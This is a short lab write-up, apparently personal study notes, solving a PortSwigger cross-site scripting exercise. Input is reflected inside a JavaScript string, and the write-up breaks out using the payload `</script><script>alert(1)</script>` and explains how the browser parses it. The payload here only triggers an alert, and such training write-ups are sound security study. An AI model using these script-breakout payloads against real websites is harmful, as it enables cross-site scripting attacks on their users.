
# #PortSwigger 


![[Pasted image 20260506135124.png]]



**Description**
	*This lab reflects user input inside a JavaScript string. Single quotes (`'`) and backslashes (`\`) are escaped, preventing you from breaking out of the string normally.*




## Solution Steps


### Step 1: Test the Input

1. Enter a random string (e.g., `"\'<haha>;`) in the search box
![[Pasted image 20260506135822.png]]

2. View the page source and find your input inside a JavaScript string:
```
var searchTerms = '"\\\'<haha>;';
```
![[Pasted image 20260506135846.png]]





### Step 2: Use Script Tag Breakout

Since you can't break out of the JavaScript string, **break out of the entire `<script>` block** instead:

**Payload:**
```
</script><script>alert(1)</script>
```

![[Pasted image 20260506140205.png]]




### Step 3: How It Works

|Part|Purpose|
|---|---|
|`</script>`|Closes the existing script block|
|`<script>alert(1)</script>`|Opens a new script block with alert|

**Resulting code:**
```
var searchTerms = '</script><script>alert(1)</script>';
```

The browser sees:
1. `var searchTerms = '` (JavaScript)
2. `</script>` (Closes script block)
3. `<script>alert(1)</script>` (New script executes)
4. `';` (Ignored)




### Step 4: Test the Exploit

1. Enter `</script><script>alert(1)</script>` in the search box
2. Click Search
3. Alert fires → Lab solved
![[Pasted image 20260506140130.png]]

![[Pasted image 20260506141326.png]]
